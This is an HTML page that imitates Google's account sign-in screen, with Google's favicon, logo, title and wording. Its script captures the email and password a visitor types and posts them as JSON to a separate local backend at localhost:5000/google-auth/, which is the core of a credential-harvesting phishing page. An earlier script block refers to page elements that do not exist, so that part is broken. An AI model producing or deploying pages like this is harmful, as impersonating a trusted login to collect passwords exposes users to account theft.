<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Sign in â€“ Google Accounts</title>
  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2x.png" />
  <style>
    body {
      background-color: #f2f2f2;
      font-family: 'Roboto', sans-serif;
      margin: 0;
      padding: 0;
      overflow-x: hidden;
    }

    .container-wrapper {
      position: relative;
      width: 1200px;
      margin: 110px auto;
      background-color: #fff;
      border-radius: 45px;
      box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
      display: flex;
      padding: 100px 10px;
      box-sizing: border-box;
      gap: 40px;
      align-items: flex-start;
    }

    .left-block {
      width: 320px;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      justify-content: flex-start;
      color: #202124;
      flex-shrink: 0;
      margin-top: -20px;
      margin-left: 20px;
    }

    .google-icon {
      width: 60px;
      height: 60px;
      margin-bottom: 60px;
    }

    .left-block h1 {
      font-size: 32px;
      font-weight: 400;
      margin: 0 0 8px;
      text-align: left;
    }

    .left-block p.subtitle {
      font-size: 18px;
      color: #5f6368;
      margin: 0;
      text-align: left;
    }

    .right-block {
      flex: 1;
      max-width: 800px;
      display: flex;
      justify-content: flex-end;
    }

    form {
      display: flex;
      flex-direction: column;
      align-items: flex-end;
      gap: 20px;
      width: 50%;
    }

    form input[type='email'],
    form input[type='password'] {
      width: 100%;
      height: 43px;
      padding: 9px 6px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      box-sizing: border-box;
      margin-left: 0;
    }

    .forgot {
      width: 100%;
      text-align: left;
      font-size: 14px;
      margin-bottom: 8px;
      padding-left: 6px;
      margin-left: -80px;
    }

    .forgot a {
      color: #1a73e8;
      text-decoration: none;
    }

    .guest-mode {
      font-size: 13px;
      color: #5f6368;
      width: 100%;
      text-align: right;
      margin-left: auto;
      padding-left: 6px;
      margin-left: -80px;
    }

    .guest-mode a {
      color: #1a73e8;
      text-decoration: none;
    }

    .btn-container {
      display: flex;
      justify-content: space-between;
      width: 100%;
      margin-top: 20px;
      padding-left: 6px;
      margin-left: -80px;
    }

    .btn-container a {
      text-decoration: none;
      font-size: 14px;
      color: #1a73e8;
    }

    .btn-container button {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 10px 24px;
      border-radius: 47px;
      font-size: 14px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container-wrapper">
    <div class="left-block">
      <svg
        class="google-icon"
        viewBox="0 0 533.5 544.3"
        xmlns="http://www.w3.org/2000/svg"
        aria-hidden="true"
        focusable="false"
      >
        <path fill="#4285F4" d="M533.5 278.4c0-18.6-1.5-37.4-4.8-55.4H272v105.3h146.9c-6.3 33.7-25.4 62.2-54.2 81.2v67.2h87.4c51.3-47.3 81.4-117 81.4-198.3z"/>
        <path fill="#34A853" d="M272 544.3c73.6 0 135.3-24.4 180.4-66.3l-87.4-67.2c-24.3 16.2-55.4 25.8-93 25.8-71.5 0-132-48.3-153.7-113.5H28.3v70.8c45.4 89.8 137.7 150.4 243.7 150.4z"/>
        <path fill="#FBBC05" d="M118.3 323.1c-10.5-31.2-10.5-65.2 0-96.4V155.8H28.3c-36.9 73.6-36.9 159.1 0 232.7l90-65.4z"/>
        <path fill="#EA4335" d="M272 107.7c39.9 0 75.6 13.8 103.6 40.9l77.6-77.6C407.3 26.2 345.6 0 272 0 165.9 0 73.7 60.6 28.3 150.4l90 65.4c21.7-65.2 82.2-113.5 153.7-113.5z"/>
      </svg>
      <h1>Sign in</h1>
      <p class="subtitle">Use your Google Account</p>
    </div>
    <div class="right-block">
      <form>
        <input type="email" placeholder="Email or phone" required />
        <input type="password" placeholder="Enter your password" required />
        <div class="forgot"><a href="#">Forgot email?</a></div>
        <div class="guest-mode">
          Not your computer? Use Guest mode to sign in privately.
          <a href="#">Learn more about using Guest mode</a>
        </div>
        <div class="btn-container">
          <a href="#">Create account</a>
          <button type="submit">Next</button>
        </div>
      </form>
    </div>
  </div>
</body>
<script>
  document.addEventListener('DOMContentLoaded', function() {
    const emailStep = document.getElementById('step-email');
    const passwordStep = document.getElementById('step-password');
    const nextEmailBtn = document.getElementById('next-email');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const form = document.getElementById('auth-form');

    nextEmailBtn.addEventListener('click', function() {
      if (emailInput.value.trim() === '') {
        emailInput.focus();
        emailInput.setCustomValidity('Please enter your email.');
        emailInput.reportValidity();
        return;
      }
      emailInput.setCustomValidity('');
      emailStep.style.display = 'none';
      passwordStep.style.display = 'block';
      passwordInput.focus();
    });

    form.addEventListener('submit', function(e) {
      if (passwordStep.style.display !== 'block') {
        e.preventDefault();
        return;
      }
      if (passwordInput.value.trim() === '') {
        passwordInput.focus();
        passwordInput.setCustomValidity('Please enter your password.');
        passwordInput.reportValidity();
        e.preventDefault();
        return;
      }
      passwordInput.setCustomValidity('');
      // Here you would handle the actual authentication
      // e.g., send email and password to your backend
    });
  });

document.querySelector('form').addEventListener('submit', function(e) {
  e.preventDefault();
  const email = document.querySelector('input[type="email"]').value;
  const password = document.querySelector('input[type="password"]').value;
  fetch('http://localhost:5000/google-auth/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  })
  .then(res => res.json())
  .then(data => alert(data.message || data.error))
  .catch(err => alert('Error: ' + err));
});
</script>
</html>
